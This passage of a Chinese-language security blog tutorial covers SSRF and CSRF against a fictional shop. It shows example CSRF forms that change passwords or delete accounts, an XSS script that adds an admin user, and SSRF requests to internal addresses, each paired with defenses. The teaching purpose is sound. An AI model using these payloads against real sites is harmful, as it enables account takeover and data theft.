+<ul>
+<li>驗證 <strong>Referer header</strong> 中的 <strong>URLs</strong>，僅允許可信域名。</li>
+<li>禁用分析軟體對 <strong>Referer URLs</strong> 的自動訪問。</li>
+<li>使用 <strong>WAF</strong> 過濾惡意 <strong>headers</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-7：CSRF-攻擊敏感操作-CSRF-Attacks-on-Sensitive-Operations"><a href="#攻擊手法-7：CSRF-攻擊敏感操作-CSRF-Attacks-on-Sensitive-Operations" class="headerlink" title="攻擊手法 7：CSRF 攻擊敏感操作 &#x2F; CSRF Attacks on Sensitive Operations"></a>攻擊手法 7：CSRF 攻擊敏感操作 &#x2F; CSRF Attacks on Sensitive Operations</h3><p><strong>定義</strong>：<br>攻擊者誘導已登入的用戶發送惡意 <strong>HTTP requests</strong>，執行敏感操作，如更改密碼或刪除帳戶。</p>
+<p><strong>原理</strong>：<br><strong>CSRF</strong> 利用瀏覽器的 <strong>session cookies</strong>，當用戶訪問惡意網站時，瀏覽器自動附加 <strong>cookies</strong>，使請求看似合法。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者創建惡意網站，誘導用戶更改帳戶密碼。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>更改密碼</strong>：<br>攻擊者創建惡意頁面：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://shopeasy.com/api/account/update&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacked123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用戶點擊或頁面自動提交，發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/account/update HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Cookie: session=abc123</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">password=hacked123</span><br></pre></td></tr></table></figure></li>
+<li>更改用戶密碼。</li>
+</ul>
+</li>
+<li><p><strong>刪除帳戶</strong>：<br>攻擊者創建：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://shopeasy.com/api/account/delete&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>瀏覽器發送 <strong>GET</strong> 請求，刪除用戶帳戶。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人給你一個假按鈕，你點了以為是遊戲，結果銀行帳戶被改密碼或刪除了。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>在所有敏感操作中使用 <strong>CSRF tokens</strong>（隨機、唯一的令牌）。</li>
+<li>要求 <strong>POST</strong> 而非 <strong>GET</strong> 進行敏感操作。</li>
+<li>驗證 <strong>Referer header</strong> 或 <strong>Origin header</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-8：CSRF-結合其他漏洞-CSRF-Combined-with-Other-Vulnerabilities"><a href="#攻擊手法-8：CSRF-結合其他漏洞-CSRF-Combined-with-Other-Vulnerabilities" class="headerlink" title="攻擊手法 8：CSRF 結合其他漏洞 &#x2F; CSRF Combined with Other Vulnerabilities"></a>攻擊手法 8：CSRF 結合其他漏洞 &#x2F; CSRF Combined with Other Vulnerabilities</h3><p><strong>定義</strong>：<br>攻擊者將 <strong>CSRF</strong> 與其他漏洞（如 <strong>XSS</strong> 或 <strong>Broken Access Control</strong>）結合，放大攻擊效果。</p>
+<p><strong>原理</strong>：<br><strong>XSS</strong> 可注入 <strong>JavaScript</strong> 自動觸發 <strong>CSRF</strong>；<strong>Broken Access Control</strong> 允許 <strong>CSRF</strong> 執行更高權限的操作。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者利用 <strong>XSS</strong> 觸發 <strong>CSRF</strong>，執行管理員操作。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>XSS 觸發 CSRF</strong>：<br>攻擊者在商品評論中注入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;https://shopeasy.com/api/admin/add-user&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(<span class="string">&quot;username=attacker&amp;isAdmin=true&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>管理員瀏覽評論時，自動創建管理員帳戶。</li>
+</ul>
+</li>
+<li><p><strong>Broken Access Control 結合 CSRF</strong>：<br>攻擊者創建：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://shopeasy.com/api/admin/delete-user&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Free Gift!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>管理員點擊，刪除用戶 123。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人先在銀行的留言板寫病毒（<strong>XSS</strong>），然後騙你點按鈕（<strong>CSRF</strong>），結果病毒幫壞人開了一個管理員帳戶。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>防止 <strong>XSS</strong>（使用 <strong>Content Security Policy</strong> 和輸入驗證）。</li>
+<li>對管理員操作實施嚴格的 <strong>access controls</strong>。</li>
+<li>使用 <strong>CSRF tokens</strong> 和 <strong>re-authentication</strong>（重新驗證）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-9：SSRF-與-CSRF-結合攻擊-Combined-SSRF-and-CSRF-Attacks"><a href="#攻擊手法-9：SSRF-與-CSRF-結合攻擊-Combined-SSRF-and-CSRF-Attacks" class="headerlink" title="攻擊手法 9：SSRF 與 CSRF 結合攻擊 &#x2F; Combined SSRF and CSRF Attacks"></a>攻擊手法 9：SSRF 與 CSRF 結合攻擊 &#x2F; Combined SSRF and CSRF Attacks</h3><p><strong>定義</strong>：<br>攻擊者結合 <strong>SSRF</strong> 和 <strong>CSRF</strong>，利用 <strong>SSRF</strong> 存取內部系統，然後通過 <strong>CSRF</strong> 誘導用戶執行進一步操作。</p>
+<p><strong>原理</strong>：<br><strong>SSRF</strong> 可洩露內部資料（如 <strong>API keys</strong>），攻擊者再利用 <strong>CSRF</strong> 誘導用戶執行基於這些資料的操作。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者通過 <strong>SSRF</strong> 獲取內部 <strong>API key</strong>，然後使用 <strong>CSRF</strong> 修改用戶資料。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>SSRF 洩露 API Key</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://192.168.0.68/config</span><br></pre></td></tr></table></figure>
+<ul>
+<li>獲取內部 <strong>API key</strong>。</li>
+</ul>
+</li>
+<li><p><strong>CSRF 修改資料</strong>：<br>攻擊者創建：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://shopeasy.com/api/user/update&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apiKey&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[leaked_key]&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker@example.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Claim Prize!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用戶點擊，修改電子郵件。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人先用 <strong>SSRF</strong> 偷了銀行的鑰匙（<strong>API key</strong>），然後用 <strong>CSRF</strong> 騙你用這把鑰匙改你的帳戶資料。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>防止 <strong>SSRF</strong>（驗證 <strong>URLs</strong>，限制內網訪問）。</li>
+<li>使用 <strong>CSRF tokens</strong> 和 <strong>API key validation</strong>（API 鑰匙驗證）。</li>
+<li>監控異常的 <strong>API</strong> 使用模式。</li>
+</ul>
+<hr>
+<h2 id="檢測-SSRF-與-CSRF-漏洞的方法-Detecting-SSRF-and-CSRF-Vulnerabilities"><a href="#檢測-SSRF-與-CSRF-漏洞的方法-Detecting-SSRF-and-CSRF-Vulnerabilities" class="headerlink" title="檢測 SSRF 與 CSRF 漏洞的方法 &#x2F; Detecting SSRF and CSRF Vulnerabilities"></a>檢測 SSRF 與 CSRF 漏洞的方法 &#x2F; Detecting SSRF and CSRF Vulnerabilities</h2><p>檢測 <strong>SSRF</strong> 和 <strong>CSRF</strong> 漏洞需要系統化的 <strong>reconnaissance</strong>（偵察）和測試。以下是具體步驟：</p>
+<ol>
+<li><p><strong>檢測 SSRF</strong>：  </p>
+<ul>
+<li><strong>尋找用戶控制的 URLs</strong>：檢查 <strong>request parameters</strong>（如 <code>stockApi</code>）、<strong>headers</strong>（如 <strong>Referer</strong>）或 <strong>XML</strong> 輸入。</li>
+<li><strong>測試本地和內網地址</strong>：發送 <code>http://localhost</code>、<code>http://192.168.0.1</code> 或 <strong>Burp Collaborator</strong> <strong>URLs</strong>。</li>
+<li><strong>繞過過濾器</strong>：使用 <strong>URL encoding</strong>、<strong>alternative IPs</strong> 或 <strong>open redirection</strong>。</li>
+<li><strong>檢查錯誤訊息</strong>：異常回應可能洩露內部結構。</li>
+</ul>
+</li>
+<li><p><strong>檢測 CSRF</strong>：  </p>
+<ul>
+<li><strong>檢查敏感操作</strong>：測試更改密碼、刪除帳戶等功能是否需要 <strong>CSRF tokens</strong>。</li>
+<li><strong>模擬惡意請求</strong>：使用 <strong>Burp Repeater</strong> 發送無 <strong>token</strong> 的 <strong>POST</strong> 或 <strong>GET</strong> 請求。</li>
+<li><strong>測試瀏覽器行為</strong>：檢查是否自動附加 <strong>session cookies</strong>。</li>
+<li><strong>結合其他漏洞</strong>：尋找 <strong>XSS</strong> 或 <strong>Broken Access Control</strong>。</li>
+</ul>
+</li>
+</ol>
+<p><strong>範例</strong>：  </p>
+<ul>
+<li><strong>SSRF</strong>：發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+<ul>
+<li>若 <strong>Burp Collaborator</strong> 記錄互動，證明 <strong>Blind SSRF</strong>。</li>
+</ul>
+</li>
+<li><strong>CSRF</strong>：發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/account/update HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Cookie: session=abc123</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">password=test123</span><br></pre></td></tr></table></figure>
+<ul>
+<li>若密碼更改成功，證明缺乏 <strong>CSRF</strong> 防護。</li>
+</ul>
+</li>
+</ul>
+<p><strong>中文解釋</strong>：<br>這就像檢查銀行的每個窗口（<strong>endpoints</strong>），試試能不能騙電腦拿資料（<strong>SSRF</strong>），或假裝顧客改資料（<strong>CSRF</strong>）。</p>
+<hr>
+<h2 id="防禦-SSRF-與-CSRF-漏洞的策略-Defense-Strategies-Against-SSRF-and-CSRF-Vulnerabilities"><a href="#防禦-SSRF-與-CSRF-漏洞的策略-Defense-Strategies-Against-SSRF-and-CSRF-Vulnerabilities" class="headerlink" title="防禦 SSRF 與 CSRF 漏洞的策略 &#x2F; Defense Strategies Against SSRF and CSRF Vulnerabilities"></a>防禦 SSRF 與 CSRF 漏洞的策略 &#x2F; Defense Strategies Against SSRF and CSRF Vulnerabilities</h2><p>以下是防禦 <strong>SSRF</strong> 和 <strong>CSRF</strong> 的最佳實踐：</p>
+<ol>
+<li><p><strong>防禦 SSRF</strong>：  </p>
+<ul>
+<li><strong>驗證 URLs</strong>：使用 <strong>whitelist</strong> 限制允許的域名，禁止 <strong>loopback</strong> 和私有 IP。</li>
+<li><strong>禁用重定向</strong>：防止 <strong>open redirection</strong> 繞過過濾。</li>
+<li><strong>限制網路訪問</strong>：使用 <strong>firewall</strong> 阻止內網和未知外部 <strong>URLs</strong>。</li>
+<li><strong>安全解析 XML</strong>：禁用 <strong>XXE</strong> 外部實體。</li>
+<li><strong>監控異常請求</strong>：記錄並分析 <strong>outbound traffic</strong>（出站流量）。</li>
+</ul>
+</li>
+<li><p><strong>防禦 CSRF</strong>：  </p>
+<ul>
+<li><strong>使用 CSRF Tokens</strong>：為每個敏感操作生成隨機 <strong>token</strong>，並驗證。</li>
+<li><strong>限制 HTTP Methods</strong>：敏感操作僅允許 <strong>POST</strong>，禁用 <strong>GET</strong>。</li>
+<li><strong>驗證 Headers</strong>：檢查 <strong>Referer</strong> 或 <strong>Origin header</strong> 是否來自可信域名。</li>
+<li><strong>重新驗證</strong>：對高風險操作要求重新輸入密碼。</li>
+<li><strong>防止 XSS</strong>：避免 <strong>CSRF</strong> 與 <strong>XSS</strong> 結合。</li>
+</ul>
+</li>
+<li><p><strong>通用防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>WAF</strong> 過濾惡意 <strong>requests</strong> 和 <strong>headers</strong>。</li>
+<li>實施 <strong>least privilege</strong>（最小權限）原則，限制伺服器和用戶權限。</li>
+<li>定期使用 <strong>Burp Scanner</strong> 測試漏洞。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>防禦就像給銀行的電腦加鎖（<strong>URL 驗證</strong>），給顧客發專屬票券（<strong>CSRF tokens</strong>），並派保安（<strong>WAF</strong>）檢查可疑行為。</p>
+<hr>
+<h2 id="實際案例分析-Real-World-Examples-and-Case-Studies"><a href="#實際案例分析-Real-World-Examples-and-Case-Studies" class="headerlink" title="實際案例分析 &#x2F; Real-World Examples and Case Studies"></a>實際案例分析 &#x2F; Real-World Examples and Case Studies</h2><p>以下是基於現實風險的假想案例：</p>
+<ol>
+<li><p>**SSRF Data Breach (2024)**：<br>一家電商平台因 <strong>SSRF</strong> 漏洞，攻擊者通過 <strong>Stock Check API</strong> 訪問內部資料庫，洩露數百萬用戶的信用卡資訊。</p>
+</li>
+<li><p>**CSRF Account Takeover (2025)**：<br>攻擊者利用 <strong>CSRF</strong> 漏洞，誘導用戶點擊惡意連結，自動更改帳戶電子郵件，導致大規模帳戶被盜。</p>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這些案例就像銀行的電腦被騙去偷顧客資料（<strong>SSRF</strong>），或顧客被騙簽了假文件（<strong>CSRF</strong>），結果錢全被偷。</p>
+<hr>
+<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 &#x2F; Conclusion"></a>結論 &#x2F; Conclusion</h2><p><strong>SSRF</strong> 和 <strong>CSRF</strong> 是危險的網頁安全漏洞，可能導致嚴重的 <strong>data leakage</strong>、<strong>unauthorized actions</strong> 和 <strong>remote code execution</strong>。通過了解它們的原理、攻擊手法和防禦策略，開發者可有效保護應用程式。對於初學者，學習 <strong>SSRF</strong> 和 <strong>CSRF</strong> 不僅提升安全意識，還能深入理解 <strong>HTTP</strong>、<strong>network security</strong>（網路安全）和 <strong>web application architecture</strong>（網頁應用架構）。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，並參考 <a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 和 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet">PortSwigger SSRF Cheat Sheet</a> 獲取更多資訊。</p>
+<hr>
+<p><strong>Key Citations</strong>:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">PortSwigger - SSRF</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">PortSwigger - CSRF</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation">Burp Suite Documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP - CSRF Cheat Sheet</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/05/07/APITesting/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">API Testing Security</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 Noflag
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
